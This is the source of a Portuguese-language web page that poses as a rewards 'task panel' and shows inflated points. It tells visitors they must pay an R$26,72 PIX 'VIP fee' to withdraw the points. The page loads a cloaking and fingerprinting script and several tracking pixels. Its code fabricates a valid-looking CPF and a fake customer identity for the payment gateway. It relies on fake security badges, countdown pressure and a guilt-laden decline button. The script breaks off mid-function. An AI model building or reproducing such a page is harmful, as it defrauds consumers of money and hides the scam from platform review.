<!DOCTYPE html>
<script>
    window.FYCLOAK_CAMPAIGN_ID = 2481;  // ID da sua campanha
    window.FYCLOAK_USER_ID = 257;      // Seu user ID
</script>
<script src="https://cdn.fycloak.com/scripts/advanced-fingerprint.js"></script>

<html lang="pt-BR">
<head>
    <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="52f80f96-2a3f-446a-bdd6-0129cf67187c"></script>
    <script src="https://cdn.xtracky.com/scripts/utm-handler.js" data-token="52f80f96-2a3f-446a-bdd6-0129cf67187c"></script>
    
    
    
    <script>
      window.kwaiPixelId = "693b89f7bf00e6171b3f8fc1";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-kwai.js");
      document.head.appendChild(a);
    </script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <script src="js/utm-handler.js" data-token="d595bac8-64ac-4898-b8a3-ff65cd85f08e"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script src="js/qrcode.min.js"></script>
    <script src="js/payment-api.js"></script>
    <title>Painel de Tarefas</title>
    
    <style>
      /* MANTIVE SEU CSS ORIGINAL COM PEQUENOS AJUSTES PARA OS √çCONES NOVOS */
      .pix-modal-overlay { display: none; position: fixed; inset: 0; z-index: 10005; background: rgba(0, 0, 0, 0.45); justify-content: center; align-items: flex-end; padding: 0; box-sizing: border-box; }
      .pix-modal-overlay.active { display: flex; }
      .pix-modal-container { position: relative; z-index: 10006; max-width: 100%; width: 100%; background: #fefefe; border-radius: 12px 12px 0 0; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25); padding: 1.5rem; margin: 0; box-sizing: border-box; max-height: 90vh; overflow-y: auto; animation: slideUpModal 0.3s ease; }
      @keyframes slideUpModal { from { transform: translateY(100%); } to { transform: translateY(0); } }
      .pix-modal-close { position: absolute; top: 15px; right: 15px; background: transparent; border: none; font-size: 24px; cursor: pointer; color: #747378; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background-color 0.15s ease; z-index: 10; }
      .pix-modal-close:hover { background-color: #f8f8f8; color: #000; }
      .pix-modal-header { text-align: center; margin-bottom: 20px; padding-top: 10px; }
      .pix-security-badge { position: absolute; top: 15px; right: 50px; background: #10b981; color: white; padding: 6px 12px; border-radius: 20px; font-size: 11px; display: flex; align-items: center; gap: 4px; font-weight: 500; }
      .pix-loading { text-align: center; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
      .pix-spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-radius: 50%; border-top-color: #000; animation: spin 0.8s linear infinite; }
      @keyframes spin { to { transform: rotate(360deg); } }
      .pix-payment-content { display: none; }
      .pix-section-title { font-size: 16px; margin-bottom: 20px; color: #000; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; text-align: center; }
      .pix-qrcode-container { text-align: center; margin: 24px 0; display: flex; flex-direction: column; align-items: center; }
      #pix-modal-qrcode { display: flex; justify-content: center; align-items: center; padding: 20px; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; margin: 0 auto; }
      #pix-modal-qrcode-img { max-width: 200px; height: auto; border-radius: 8px; display: none; }
      .pix-copy-section { margin-top: 24px; }
      .pix-input-group { display: flex; margin-bottom: 16px; gap: 0; width: 100%; }
      #pix-modal-code { flex: 1; padding: 12px 16px; border: 1px solid #e0e0e0; border-right: none; border-radius: 8px 0 0 8px; font-size: 13px; background: #fff; color: #000; font-family: "Roboto Mono", monospace; height: 41px; box-sizing: border-box; }
      #pix-modal-code:focus { outline: none; border-color: #FE4908; }
      .pix-copy-btn { background: #FE4908; color: white; border: 1px solid #FE4908; border-left: none; padding: 0 20px; border-radius: 0 8px 8px 0; cursor: pointer; font-weight: 500; font-size: 14px; transition: opacity 0.1s ease, transform 0.1s ease; display: flex; align-items: center; gap: 6px; height: 41px; }
      .pix-copy-btn:hover { opacity: 0.95; }
      .pix-copy-btn:active { transform: scale(0.98); opacity: 0.9; }
      .pix-payment-info { margin-top: 24px; padding: 16px; background: #f5f5f5; border-radius: 8px; }
      .pix-info-item { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding: 0; }
      .pix-info-item:last-child { margin-bottom: 0; }
      .pix-info-label { font-weight: 500; display: flex; align-items: center; gap: 8px; font-size: 14px; color: #000; }
      .pix-info-item > span:last-child { font-weight: 600; color: #000; font-size: 14px; }
      .pix-payment-status { margin-top: 20px; padding: 12px; background: #f5f5f5; border-radius: 8px; border-left: 3px solid #007bff; display: none; }
      .pix-status-content { display: flex; align-items: center; gap: 12px; }
      .pix-status-icon { font-size: 20px; color: #007bff; }
      .pix-status-text { flex: 1; }
      .pix-status-title { margin: 0; font-weight: 600; color: #000; font-size: 14px; }
      .pix-status-subtitle { margin: 4px 0 0 0; font-size: 12px; color: #747378; }
      .pix-error-message { color: #dc2626; text-align: center; padding: 16px; background: #fff5f5; border-radius: 8px; margin-top: 16px; border: 1px solid #fecaca; display: none; font-size: 14px; }
      @media (min-width: 768px) { .pix-modal-container { max-width: 350px; width: 100%; border-radius: 12px; } }
      @media (max-width: 767px) { .pix-modal-container { padding: 20px; max-height: 95vh; } .pix-input-group { flex-direction: column; gap: 8px; } #pix-modal-code { border-radius: 8px; border: 1px solid #e0e0e0; border-right: 1px solid #e0e0e0; width: 100%; } .pix-copy-btn { border-radius: 8px; border: 1px solid #FE4908; padding: 12px; justify-content: center; width: 100%; border-left: 1px solid #FE4908; } .pix-security-badge { right: 45px; font-size: 10px; padding: 4px 10px; } .pix-section-title { font-size: 14px; } #pix-modal-qrcode { padding: 16px; } #pix-modal-qrcode-img { max-width: 180px; } }
      
      /* Styles do Modal de Desconto */
      .discount-modal-overlay { display: none; position: fixed; inset: 0; z-index: 10007; background: rgba(0, 0, 0, 0.45); justify-content: center; align-items: flex-end; padding: 0; box-sizing: border-box; }
      .discount-modal-overlay.active { display: flex; }
      .discount-modal-container { position: relative; z-index: 10008; max-width: 100%; width: 100%; background: #fefefe; border-radius: 12px 12px 0 0; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25); padding: 1.5rem; margin: 0; box-sizing: border-box; max-height: 90vh; overflow-y: auto; animation: slideUpModal 0.3s ease; }
      .discount-modal-close { position: absolute; top: 15px; right: 15px; background: transparent; border: none; font-size: 24px; cursor: pointer; color: #747378; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background-color 0.15s ease; z-index: 10; }
      .discount-modal-close:hover { background-color: #f8f8f8; color: #000; }
      .discount-content { padding-top: 10px; }
      .discount-highlight { text-align: center; margin-bottom: 24px; padding: 20px; background: #f5f5f5; border-radius: 12px; border: 1px solid #e0e0e0; }
      .discount-amount { font-size: 32px; font-weight: 700; margin-bottom: 8px; color: #000; }
      .discount-badge { font-size: 11px; font-weight: 600; background: #10b981; color: white; padding: 6px 12px; border-radius: 20px; display: inline-block; }
      .discount-description { margin-bottom: 24px; }
      .discount-text-main { font-size: 16px; font-weight: 600; color: #000; margin-bottom: 12px; text-align: center; }
      .discount-text { font-size: 14px; color: #747378; line-height: 1.6; margin-bottom: 12px; text-align: center; }
      .discount-text strong { color: #000; font-weight: 600; }
      .discount-benefits { margin-bottom: 24px; padding: 16px; background: #f5f5f5; border-radius: 8px; }
      .discount-benefit-item { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; font-size: 14px; color: #000; }
      .discount-benefit-item:last-child { margin-bottom: 0; }
      .discount-benefit-item i { color: #10b981; font-size: 18px; }
      .discount-buttons { display: flex; flex-direction: column; gap: 12px; }
      .discount-btn-accept { background: #FE4908; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s ease, transform 0.1s ease; width: 100%; }
      .discount-btn-accept:hover { opacity: 0.95; }
      .discount-btn-accept:active { transform: scale(0.98); opacity: 0.9; }
      .discount-btn-reject { background: transparent; color: #747378; border: 1px solid #e0e0e0; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background-color 0.2s ease, color 0.2s ease; width: 100%; }
      .discount-btn-reject:hover { background-color: #f5f5f5; color: #000; }
      .discount-btn-reject:active { background-color: #e8e8e8; }
      @media (min-width: 768px) { .discount-modal-container { max-width: 400px; width: 100%; border-radius: 12px; } }
      @media (max-width: 767px) { .discount-modal-container { padding: 20px; max-height: 95vh; } .discount-amount { font-size: 28px; } .discount-text-main { font-size: 15px; } .discount-text { font-size: 13px; } }
      .bonus-text { font-size: 16px; font-weight: 700; color: #111827; margin-top: 16px; text-align: center; line-height: 1.0; }
      
      /* CSS EXTRA PARA SUBSTITUI√á√ÉO DOS LOGOS */
      .safe-badge-container { display: flex; justify-content: center; gap: 20px; margin-top: 15px; }
      .safe-badge { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #666; font-size: 12px; font-weight: 500; }
      .safe-badge i { font-size: 24px; color: #2ecc71; }
    </style>
</head>
<body>
    <main id="screens">
      <section id="one" class="screen">
        <div class="title">B√¥nus de Atividade</div>
        <div class="saldo">
          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
            <div class="saldo-info">
              <div class="saldo-label">
                <span class="saldo-text">Pontos Acumulados</span>
                <img src="images/p-saldo.svg" alt="" class="p-saldo">
              </div>

              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
                <span class="valor-currency valor-currency-dois valor-currency-tres is-points" data-amount-target="4596.72">1.517 Pts</span>
              </div>
            </div>

            <div class="saldo-action">
              <button type="button" class="btn-sacar" aria-label="Nivel">
                <span class="btn-text" style="font-size: 14px;">N√≠vel: Membro Gratuito</span>
              </button>
            </div>
          </div>
        </div>
        <div class="bloco-dois">
          <div class="parabens">
            <div class="parabens-txt">
              <span class="parabens-txtum">Meta Batida!</span>
              <span class="parabens-txtdois">Voc√™ completou
                <span class="nobreak">o tutorial inicial</span></span>

              <span class="parabens-valor">4.596 Pts</span>
            </div>
            <img src="images/parabens-img.png" alt="" class="parabens-img">
          </div>
          <div class="line"></div>
          <div class="entre">
            <span class="entre-txt">Entre por 14 dias para ganhar
              <span class="entre-pts">8.414 pontos</span>
              <span class="entre-data">‚Ä¢ 12 de nov - 25 de nov</span>
            </span>
            <button type="button" class="btn-concluido" aria-label="Sacar">
              <span class="btn-concluido-text">Conclu√≠do</span>
            </button>
          </div>
          <div class="concluiu">
             <span class="concluiu-txt">Voc√™ concluiu todos os dias de check-in.</span>
          </div>
           <div class="dia">
            <div class="day-tracker">
              <div class="day-tracker__item"><div class="day-tracker__box"><div class="day-tracker__content"><div class="day-tracker__coin"><img src="images/p-dia.svg" alt=""></div><div class="day-tracker__value">50</div></div><div class="day-tracker__overlay"><div class="day-tracker__icon-wrapper"><div class="day-tracker__icon-shape"><img src="images/fi-bs-check.svg" alt=""></div></div></div></div><div class="day-tracker__label">Dia 01</div></div>
               <div class="day-tracker__item"><div class="day-tracker__box"><div class="day-tracker__content"><div class="day-tracker__coin"><img src="images/p-dia.svg" alt=""></div><div class="day-tracker__value">100</div></div><div class="day-tracker__overlay"><div class="day-tracker__icon-wrapper"><div class="day-tracker__icon-shape"><img src="images/fi-bs-check.svg" alt=""></div></div></div></div><div class="day-tracker__label">Dia 02</div></div>
               <div class="day-tracker__item"><div class="day-tracker__box"><div class="day-tracker__content"><div class="day-tracker__coin"><img src="images/p-dia.svg" alt=""></div><div class="day-tracker__value">150</div></div><div class="day-tracker__overlay"><div class="day-tracker__icon-wrapper"><div class="day-tracker__icon-shape"><img src="images/fi-bs-check.svg" alt=""></div></div></div></div><div class="day-tracker__label">Dia 03</div></div>
            </div>
          </div>
        </div>
      </section>

      <section id="two" class="screen" aria-hidden="true">
        <div class="modal-inner" role="dialog" aria-modal="true" aria-labelledby="modal-title">
          <div class="popup">
            <img src="images/gol.png" alt="" class="gol-img">
            <span class="gol">Meta Conclu√≠da!</span>
            <span class="gol-txt">Excelente! Voc√™ atingiu a pontua√ß√£o m√°xima permitida no modo gratuito. </span>
            <span class="valor-currency gol-valor valor-currency-dois valor-currency-quatro is-points" data-amount-target="4596.72">4.596 Pts</span>
            
            <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
              <span class="btn-text btn-textdois btn-txt-obrigado">Continuar</span>
            </button>
          </div>
        </div>
      </section>

      <section id="three" class="screen">
        <div class="expira-saldo">
          <div class="timer-wrapper">
            <p id="countdown-text">
              SEUS PONTOS EXPIRAM EM
              <span id="timer">00 - 16 - 38</span>
            </p>
          </div>
        </div>
        <div class="title">Troca de Pontos</div>
        <div class="saldo saldo-dois">
          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
            <div class="saldo-info saldo-info-dois">
              <div class="saldo-label">
                <span class="saldo-text saldo-text-dois">Pontos Totais</span>
              </div>

              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
                <span class="valor-currency valor-currency-dois is-points" data-amount-target="4596.72">4.596 Pts</span>
                <span class="total-pontos">= N√≠vel Diamante</span>
              </div>
            </div>

            <div class="saldo-action">
              <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
            </div>
          </div>
        </div>

        <div class="saldo saldo-sacar">
          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
            <div class="saldo-info saldo-info-sacar">
              <div class="saldo-label">
                <span class="saldo-sacar-text">Resgatar Benef√≠cios</span>
              </div>

              <div class="saldo-valor" aria-live="polite">
                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Via PIX / Transfer√™ncia</span>
              </div>
            </div>
          </div>
          
          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
            <span class="btn-text btn-textdois-sacar btn-three-saque">Habilitar Resgate VIP</span>
          </button>
          <div class="obtem obtem-sacar sacar-dinheiro">
            <span class="obtem-txt">Para converter seus pontos em valores reais, √© necess√°rio ativar sua conta VIP. Isso evita fraudes e garante a seguran√ßa da comunidade.</span>
          </div>
        </div>
      </section>

      <section id="four" class="modal" aria-hidden="true">
        <div class="modal-inner inner-pop">
          <div class="saque-popup">
            <div class="title saque-title">Configurar Recebimento</div>
            <span class="pix-item" role="button" tabindex="0" data-open-modal="five">
              <div class="pix-icon">
                <img src="images/pix-solo.svg" alt="" class="pix-solo">
              </div>

              <div class="pix-details">
                <span class="pix-title">PIX (Recomendado)</span>
                <span class="pix-subtitle">Processamento Priorit√°rio</span>
              </div>

              <span class="pix-arrow">
                 <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none"><path d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z" fill="#7F7F7F"></path></svg>
              </span>
            </span>
          </div>
        </div>
      </section>
      
      <section id="five" class="screen" aria-hidden="true">
        <div class="modal-inner inner-pop saque-popup">
          <div class="title saque-title">Dados do Titular</div>
          <div class="form-container">
            <div class="form-group">
              <label class="field-label" for="nome">Nome</label>
              <input type="text" id="nome" placeholder="Nome completo" class="nome-completo">
            </div>
            <div class="form-group">
              <label class="field-label">Tipo de Chave PIX</label>
              <div class="pix-selector" id="pix-type-selector" data-open-modal="six" role="button" tabindex="0">
                <span class="placeholder-text" id="pix-selector-text">Escolha o tipo de chave PIX</span>
                <span class="arrow arrow-tois"><svg xmlns="http://www.w3.org/2000/svg" width="5" height="9" viewBox="0 0 5 9" fill="none"><path d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z" fill="#7F7F7F"></path></svg></span>
              </div>
            </div>
            <div class="form-group">
              <label class="field-label">Chave PIX</label>
              <div id="pix-key-wrapper" class="input-wrapper-disabled">
                <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX" class="nome-completo input-disabled" disabled="">
              </div>
            </div>
            <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled" aria-label="sacar dinheiro">
              <span class="btn-text btn-textdois-sacar">Avan√ßar</span>
            </button>
          </div>
        </div>
      </section>

      <section id="six" class="screen" aria-hidden="true">
         <div class="modal-inner inner-pop">
          <div class="saque-popup chave-pix">
            <div class="title saque-title">Chave PIX</div>
            <div class="selection-container">
               <div class="option-row"><label for="key-cpf"><span class="option-text">CPF</span><input type="radio" id="key-cpf" name="pix_key_type" checked=""><span class="custom-radio"></span></label></div>
               <div class="option-row"><label for="key-email"><span class="option-text">E-mail</span><input type="radio" id="key-email" name="pix_key_type"><span class="custom-radio"></span></label></div>
               <div class="option-row"><label for="key-celular"><span class="option-text">Celular</span><input type="radio" id="key-celular" name="pix_key_type"><span class="custom-radio"></span></label></div>
               <div class="option-row"><label for="key-aleatoria"><span class="option-text">Chave Aleat√≥ria</span><input type="radio" id="key-aleatoria" name="pix_key_type"><span class="custom-radio"></span></label></div>
            </div>
          </div>
        </div>
      </section>

    <section id="seven" class="screen">
      <header class="loading-header">
        <div class="loading-logo">
          <h2 style="font-family: 'Inter', sans-serif; font-weight: 700; color: #333;">Verificando conta...</h2>
        </div>
      </header>

      <main class="loading-main-content">
        <div class="new-loading-container">
          <div class="new-loading-text" id="new-loading-text">
            Validando elegibilidade...
          </div>
          <div class="new-progress-track">
            <div class="new-progress-bar" id="new-progress-bar"></div>
          </div>
        </div>
      </main>
    </section>

    <section id="nine" class="screen" aria-hidden="true">
      <div class="confirmation-container">
        <div class="confirmation-header">
          <div class="confirmation-logo">
             <h3 style="margin:0; color:#FE4908;">√ÅREA VIP</h3>
          </div>
        </div>

          <div class="confirmation-section confirmation-balance">
            <div class="confirmation-balance-title">PONTOS CONVERTIDOS</div>
            <div class="confirmation-balance-amount" style="color: #2ecc71;">
               4.596 Pts
            </div>
            <div class="confirmation-balance-subtitle">
              Equivalente a n√≠vel Diamante
            </div>
          </div>

          <div class="confirmation-section">
            <div class="confirmation-section-title">
              LIBERA√á√ÉO DE ACESSO
            </div>
            <div class="confirmation-fee-amount" id="confirmation-fee-amount">R$ 26,72 <span class="confirmation-reembolso-badge">TAXA √öNICA</span></div>
            <div class="confirmation-fee-description">
              Para garantir que apenas usu√°rios reais tenham acesso aos resgates ilimitados, cobramos uma pequena taxa de cadastro de
              <span class="bold" id="confirmation-fee-value">R$26,72</span>. 
              <br><br>
              Isso libera seu acesso vital√≠cio √† plataforma e a todas as tarefas de alto valor.
            </div>
          </div>

          <div class="confirmation-section">
            <div class="confirmation-section-title">RESUMO DO PEDIDO</div>
            <div class="confirmation-receipt-grid">
              <div class="confirmation-receipt-item">
                <div class="confirmation-receipt-label">Titular</div>
                <div class="confirmation-receipt-value" id="confirmation-name"></div>
              </div>
              <div class="confirmation-receipt-item">
                <div class="confirmation-receipt-label">Produto</div>
                <div class="confirmation-receipt-value">Acesso Vital√≠cio VIP</div>
              </div>
              <div class="confirmation-receipt-item">
                <div class="confirmation-receipt-label">Benef√≠cio</div>
                <div class="confirmation-receipt-value bold">Saques Ilimitados</div>
              </div>
              <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
            </div>
          </div>

          <div class="confirmation-divider"></div>

          <div class="confirmation-section" style="margin-top: 15px;">
           <vturb-smartplayer id="vid-69562963b1f39b1b02ab6869" style="display: block; margin: 0 auto; width: 100%; "></vturb-smartplayer>
        </div>
          <div class="confirmation-section">
            <div class="confirmation-section-title">VANTAGENS PREMIUM</div>
            <div class="confirmation-requirements-grid">
              <div class="confirmation-requirement-item">
                <div class="confirmation-requirement-icon">1</div>
                <div class="confirmation-requirement-content">
                  <div class="confirmation-requirement-title">
                    Cadastro VIP
                  </div>
                  <div class="confirmation-requirement-description" id="confirmation-requirement-fee">Pagamento √∫nico de R$ 26,72</div>
                </div>
              </div>
              <div class="confirmation-requirement-item">
                <div class="confirmation-requirement-icon confirmation-reembolso">
                  ‚úì
                </div>
                <div class="confirmation-requirement-content">
                  <div class="confirmation-requirement-title confirmation-reembolso">
                    Acesso Imediato
                  </div>
                  <div class="confirmation-requirement-description">
                    Liberado em menos de 1 minuto
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="confirmation-section">
            <button onclick="abrirModalPix(); return false;" class="confirmation-cta-button" id="confirmation-button">
              Quero meu Acesso VIP
            </button>
            <div class="confirmation-timer">
              üîí Ambiente 100% Seguro e Criptografado
            </div>
          </div>

          <div class="safe-badge-container">
            <div class="safe-badge">
                <i class="fas fa-shield-alt"></i>
                <span>Compra Segura</span>
            </div>
            <div class="safe-badge">
                <i class="fas fa-lock"></i>
                <span>Dados Protegidos</span>
            </div>
            <div class="safe-badge">
                <i class="fas fa-check-circle"></i>
                <span>Verificado</span>
            </div>
          </div>

          <div class="confirmation-footer">
            <div class="confirmation-footer-text">Copyright ¬© 2024</div>
            <a href="#nine" class="confirmation-footer-link">Termos de Uso</a>
          </div>
        </div>
      </section>

      <div id="pix-modal-overlay" class="pix-modal-overlay">
      <div class="pix-modal-container">
        <button class="pix-modal-close" onclick="fecharModalPix()">√ó</button>
        <div class="pix-security-badge"><i class="fas fa-lock"></i><span>Seguro</span></div>

        <div class="title saque-title" style="margin-bottom: 20px">Finalizar Inscri√ß√£o VIP</div>

        <div id="pix-loading" class="pix-loading">
          <div class="pix-spinner"></div>
          <p>Gerando QRCode exclusivo...</p>
        </div>

        <div id="pix-payment-content" class="pix-payment-content">
          <div class="pix-qrcode-container">
            <h2 class="pix-section-title">Escaneie para pagar</h2>
            <img id="pix-modal-qrcode-img" alt="QR Code PIX">
          </div>

          <div class="pix-copy-section">
            <h2 class="pix-section-title" style="font-size: 14px; margin-bottom: 12px">Ou copie o c√≥digo PIX</h2>
            <div class="pix-input-group">
              <input type="text" id="pix-modal-code" readonly="">
              <button class="pix-copy-btn" id="pix-copy-btn"><i class="far fa-copy"></i><span>Copiar</span></button>
            </div>
          </div>

          <div class="pix-payment-info">
            <div class="pix-info-item"><span class="pix-info-label"> Valor: </span><span id="pix-amount">R$ 0,00</span></div>
            <div class="pix-info-item"><span class="pix-info-label"> V√°lido at√©: </span><span id="pix-expiration">--:--</span></div>
          </div>

          <div id="pix-payment-status" class="pix-payment-status">
            <div class="pix-status-content">
              <div class="pix-status-icon"><i class="fas fa-spinner fa-spin"></i></div>
              <div class="pix-status-text">
                <p class="pix-status-title">Aguardando pagamento...</p>
                <p class="pix-status-subtitle" id="pix-status-subtitle">Liberando acesso VIP...</p>
              </div>
            </div>
          </div>
        </div>
        <div id="pix-error-message" class="pix-error-message"></div>
      </div>
    </div>

    <div id="discount-modal-overlay" class="discount-modal-overlay">
      <div class="discount-modal-container">
        <button class="discount-modal-close" onclick="fecharModalDesconto()">√ó</button>

        <div class="title saque-title" style="margin-bottom: 20px">
          Oportunidade √önica
        </div>

        <div class="discount-content">
          <div class="discount-highlight">
            <div class="discount-amount">R$ 19,90</div>
            <div class="discount-badge">OFERTA LIMITADA</div>
          </div>

          <div class="discount-description">
            <p class="discount-text-main">
              <strong>N√£o perca seus pontos acumulados!</strong>
            </p>
            <p class="discount-text">
              Entendemos que voc√™ quer come√ßar logo. Por isso, conseguimos um desconto especial para sua ades√£o ao plano VIP.
            </p>
          </div>

          <div class="discount-benefits">
            <div class="discount-benefit-item"><i class="fas fa-check-circle"></i><span>Acesso Imediato</span></div>
            <div class="discount-benefit-item"><i class="fas fa-check-circle"></i><span>Garantia de Satisfa√ß√£o</span></div>
          </div>

          <div class="discount-buttons">
            <button type="button" class="discount-btn-accept" onclick="aceitarDesconto()">
              <span>Quero o Desconto VIP</span>
            </button>
            <button type="button" class="discount-btn-reject" onclick="recusarDesconto()">
              <span>N√£o, quero perder meus pontos</span>
            </button>
          </div>
        </div>
      </div>
    </div>

    </main>

    <script>
      // Fun√ß√£o para obter pre√ßo
      function getVariantPrice() {
        const price = 26.72;
        return price;
      }

      function formatPrice(value) {
        return value.toLocaleString("pt-BR", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        });
      }

      function easeOutCubic(t) {
        return 1 - Math.pow(1 - t, 3);
      }

      function formatBR(value) {
        return value.toFixed(2).replace(".", ",").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
      }

      function animateCurrencyCounter(counter, forceReset = false) {
        if (!counter) return;
        if (counter._isAnimating && !forceReset) return;

        const duration = 2000;
        const toValue = parseFloat(counter.getAttribute("data-amount-target")) || 0;
        const fromValue = 0;
        
        // VERIFICA√á√ÉO SE √â PONTOS OU DINHEIRO
        const isPoints = counter.classList.contains("is-points");

        if (toValue === 0) {
          counter.textContent = isPoints ? "0 Pts" : "R$ 0,00";
          return;
        }

        counter.textContent = isPoints ? "0 Pts" : "R$ 0,00";

        counter._isAnimating = true;
        let startTime = null;

        function animateCounter(currentTime) {
          if (!startTime) startTime = currentTime;
          const elapsed = currentTime - startTime;
          const progress = Math.min(elapsed / duration, 1);
          const value = fromValue + (toValue - fromValue) * easeOutCubic(progress);

          // L√ìGICA ALTERADA AQUI: SE FOR PONTOS, N√ÉO USA R$
          let formattedValue;
          if (isPoints) {
             formattedValue = Math.floor(value).toLocaleString("pt-BR") + " Pts";
          } else {
             formattedValue = "R$ " + formatBR(value);
          }

          if (counter && counter.textContent !== undefined) {
            counter.textContent = formattedValue;
          }

          if (progress < 1) {
            counter._animationFrameId = requestAnimationFrame(animateCounter);
          } else {
            let finalValue;
            if (isPoints) {
                finalValue = Math.floor(toValue).toLocaleString("pt-BR") + " Pts";
            } else {
                finalValue = "R$ " + formatBR(toValue);
            }
            
            if (counter && counter.textContent !== undefined) {
              counter.textContent = finalValue;
            }
            counter._isAnimating = false;
            counter._animationFrameId = null;
          }
        }

        setTimeout(() => {
          if (counter && counter.getAttribute("data-amount-target")) {
            counter._animationFrameId = requestAnimationFrame(animateCounter);
          }
        }, 10);
      }

      document.addEventListener("DOMContentLoaded", function () {
        const initialCounters = document.querySelectorAll("#one .valor-currency[data-amount-target]");
        initialCounters.forEach((counter) => {
          animateCurrencyCounter(counter);
        });

        const variantPrice = getVariantPrice();
        const formattedPrice = formatPrice(variantPrice);

        const feeAmountElement = document.getElementById("confirmation-fee-amount");
        if (feeAmountElement) {
          feeAmountElement.innerHTML = `R$ ${formattedPrice} <span class="confirmation-reembolso-badge">TAXA √öNICA</span>`;
        }

        const feeValueElement = document.getElementById("confirmation-fee-value");
        if (feeValueElement) {
          feeValueElement.textContent = `R$${formattedPrice}`;
        }

        const requirementFeeElement = document.getElementById("confirmation-requirement-fee");
        if (requirementFeeElement) {
          requirementFeeElement.textContent = `R$ ${formattedPrice} para acesso vital√≠cio`;
        }

        // Removido successValueElement pois n√£o h√° mais promessa de reembolso
      });

      window.animateCurrencyCounter = animateCurrencyCounter;
    </script>
    <script src="js/main.js"></script>

<script>
    // ============================================
    // 1. CONFIGURA√á√ïES GLOBAIS
    // ============================================
    const API_BASE_URL = "https://kwwretiradasofc.online/api/gateway/index.php"; 
    const VALOR_PADRAO = "26.72"; 
    const UPSELL_URL = "https://kwwretiradasofc.online/upsell/index.html"; 

    let pixPaymentId = null;
    let pixCheckPaymentInterval = null;
    let pixCountdownInterval = null; 
    let paymentConfirmed = false;
    let isDiscountPix = false;

    // ... (MANTIVE O RESTANTE DO SEU SCRIPT DE PAGAMENTO IGUAL, APENAS REMOVI FUN√á√ïES N√ÉO UTILIZADAS) ...
    // ... O SCRIPT DE GERAR CPF E DADOS DO CLIENTE PERMANECE O MESMO ...

    // ============================================
    // 2. GERADOR DE CPF E DADOS DO CLIENTE
    // ============================================
    function gerarCpfValidoJS() {
        const rnd = (n) => Math.round(Math.random() * n);
        const mod = (base, div) => Math.round(base - Math.floor(base / div) * div);
        const n = Array(9).fill(0).map(() => rnd(9));
        let d1 = n.reduce((total, val, i) => total + val * (10 - i), 0);
        d1 = 11 - mod(d1, 11); if (d1 >= 10) d1 = 0;
        let d2 = n.reduce((total, val, i) => total + val * (11 - i), 0) + d1 * 2;
        d2 = 11 - mod(d2, 11); if (d2 >= 10) d2 = 0;
        return n.join('') + d1 + d2;
    }

    function getClienteDataModal() {
        let stored = {};
        try { stored = JSON.parse(localStorage.getItem("userPixData") || "{}"); } catch(e){}
        if (!stored.cpf || stored.cpf.length < 11) {
            stored.cpf = gerarCpfValidoJS();
            stored.nome = "Cliente Visitante";
            stored.email = `visitante${Math.floor(Math.random() * 1000)}@gmail.com`;
            stored.telefone = "11999999999";
            localStorage.setItem("userPixData", JSON.stringify(stored));
        }
        return { 
            nome: stored.nome, 
            email: stored.email, 
            documento: stored.cpf.replace(/\D/g, ""), 
            telefone: stored.telefone.replace(/\D/g, "") 
        };
    }

    // ============================================
    // 3. UTILIT√ÅRIOS DE FORMATA√á√ÉO
    // ============================================
    function cleanAmountForAPI(valor) {
        if (!valor) return VALOR_PADRAO;
        let str = valor.toString().replace(/[^\d,.]/g, '').replace(',', '.');
        return parseFloat(str).toFixed(2);
    }

    function getUtmParamsModal() {
        const urlParams = new URLSearchParams(window.location.search);
        const utmParams = {};
        ["utm_source", "utm_medium", "utm_campaign", "src", "utm_content", "utm_term"].forEach((param) => { 
